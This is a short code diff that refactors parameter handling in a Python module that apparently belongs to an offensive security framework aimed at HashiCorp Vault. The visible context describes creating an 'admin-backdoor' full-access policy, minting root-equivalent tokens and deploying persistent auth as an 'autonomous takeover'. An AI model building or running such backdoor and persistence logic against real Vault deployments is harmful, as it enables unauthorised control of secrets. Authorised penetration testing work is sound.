@@ -48,6 +48,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
             module_id="privilege_escalation.token_abuse",
             title="Active Token Privilege Escalation & Autonomous Takeover",
             risk_level=RiskLevel.STATE_CHANGING,
+            domain="token",
             description=(
                 "Detects wildcard sudo paths, creates admin-backdoor policies, "
                 "generates root-equivalent tokens, and deploys persistent auth "
@@ -94,7 +95,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
         if can_manage_policies:
             return self._autonomous_takeover(
                 vault_addr, headers, timeout, verify_tls,
-                requested_ttl, source_policies, context, namespace,
+                requested_ttl, source_policies, context, namespace, params,
             )
 
         # ── Phase 2: Fallback — try candidate policies ─────────────────
@@ -115,7 +116,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
 
     def _autonomous_takeover(
         self, vault_addr, headers, timeout, verify_tls,
-        ttl, source_policies, context, namespace,
+        ttl, source_policies, context, namespace, params=None,
     ):
         """Full takeover: create admin-backdoor policy → create token → deploy persistence."""
         evidence: dict = {
@@ -139,7 +140,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
         )
 
         # Step 2: Create admin-backdoor policy
-        backdoor_policy = params_or_default(context, "backdoor_policy_name", "admin-backdoor")
+        backdoor_policy = (params or {}).get("backdoor_policy_name", "admin-backdoor")
         policy_created = _create_or_update_policy(
             vault_addr, headers, backdoor_policy, FULL_ACCESS_POLICY,
             timeout, verify_tls,
@@ -414,12 +415,6 @@ def _enable_userpass_auth(vault_addr, headers, timeout, verify_tls):
 # -----------------------------------------------------------------------
 # Helpers — existing
 # -----------------------------------------------------------------------
-
-
-def params_or_default(context, key, default):
-    """Read a parameter from context or return *default*."""
-    params = getattr(context, "params", None) or {}
-    return params.get(key, default)
 
 
 def _lookup_source_policies(vault_addr, headers, timeout, verify_tls):
